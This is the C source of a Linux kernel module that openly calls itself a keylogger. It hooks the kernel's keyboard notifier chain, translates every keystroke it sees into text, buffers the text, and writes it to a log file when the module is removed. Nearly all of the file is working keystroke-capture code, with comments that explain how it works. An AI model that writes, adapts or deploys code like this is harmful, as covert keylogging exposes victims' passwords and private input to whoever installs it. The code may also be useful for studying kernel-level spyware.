/* ===========================
 * Keyboard Notifier Keylogger
 * ===========================
 *
 * Description:
 * -----------
 *      This is a kernel-based keylogger written for linux.  It is (most
 * unoriginally) named kbd_notifier, after its method of capturing keystrokes.
 * To do its keylogging, kbd_notifier abuses the linux notifier chains, through
 * which kernel modules may request notice when a kernel event occurs.
 * kbd_notifier registers for notification when keystrokes occur, and simply
 * logs each keystroke as it happens.
 *
 * Translation:
 * -----------
 *      In order to register for notification of keyboard events, kdb_notifier
 * registers a callback function with the notifier chain.  When a keystroke
 * occurs, the notifier chain calls kbd_notifier's callback, and passes a
 * pointer to a keyboard_notifier_param structure, which contains information
 * about the keystroke.  The keyboard_notifier_param does not provide an ascii
 * representation of each keystoke, so kbd_notifier must do some translation in
 * order to get human-readable information to log.  This translation is done
 * using the methods in the keysym.h header file.
 *
 * Logging:
 * -------
 *      After translation, the ascii representation of each keystroke is
 * appended to a (very large) buffer.  The contents of this buffer is stored to
 * a file when the module is removed from the system.  This is obviously not a
 * great way of storing the logged keystrokes, but it is done this beacause
 * there is some issue with writting to files from withing a function called by
 * an interrupt handler (meaning that logging from a timer callback won't work
 * either).  The "right" way to handle would be to make the contents of the
 * buffer available to user-space (via the /proc or /sys file systems), and
 * have a user space program write the keystrokes to a file.  Alas, I am lazy,
 * so I took the easy approach.
 *
 * 
 */
#include <linux/init.h>
#include <linux/module.h>

#include "headers/keysym.h"
#include "headers/kfile.h"

#define LOG_PATH "notifier.log"

int kstroke_handler(struct notifier_block *, unsigned long, void *);

//log file
static struct file *log;

//buffer for translated key symbols
static char trans[BUFLEN];

//notifier block for kbd_listener
static struct notifier_block nb = {
  .notifier_call = kstroke_handler
};

/*Called when a key is pressed.
 *Translates the keystroke into a string and stores them for writing to our log
 *file in the module's exit function.
 *
 *Parameters:
 *  nb    - notifier block we registered with
 *  mode  - keyboard mode
 *  param - keyboard_notifier_param with keystroke data
 *
 *Returns:
 *  zero (call me lazy)
 */
int kstroke_handler(struct notifier_block *nb,
                    unsigned long mode, void *param) {
  struct keyboard_notifier_param *kbd_np = param;

  switch (mode) {
    case KBD_KEYCODE :
      //ignore keycodes
      //we'll grab keys further down the line disc (once the kernel has done
      //some work for us)
      break;

    case KBD_UNBOUND_KEYCODE:
    case KBD_UNICODE :
      //for simplicity, we keyboard events when the keyboard sends us unicode.
      //unicode is used for special function keys--not the f-keys, but stuff
      //like extra media keys (i.e. play, pause, etc.) or web-navigation keys
      //(i.e. home, refresh, etc).
      break;

    case KBD_KEYSYM :
      //now grab key symbols and translate them
      xlate_keysym(kbd_np, trans);
      break;

    case KBD_POST_KEYSYM :
      //the kernel can do more processing for us, but we don't let it for
      //backwards-compatibility reasons: older kernel's don't take this step
      //for most keys.
      break;

    default :
      //this should never get executed
      printk(KERN_ALERT "KBD_N - Error: Unknown keyboard mode.\n");
      break;
  }
  return 0;
}

static int hello_init(void) {
  printk(KERN_ALERT "KBD_N - Installing kbd_notifier.\n");

  //notice when a key is pressed?  yes, please!
  register_keyboard_notifier(&nb);

  return 0;
}

static void hello_exit(void) {

  //unregister kbd_listener
  unregister_keyboard_notifier(&nb);

  //write keystrokes into the log file
  log = kopen(LOG_PATH, O_WRONLY|O_CREAT|O_APPEND, 0644);
  kwrite(log, 0, trans, strlen(trans));
  kclose(log);

  printk(KERN_ALERT "KBD_N - kbd_notifier removed.\n");
}

MODULE_LICENSE("GPL");
module_init(hello_init);
module_exit(hello_exit);

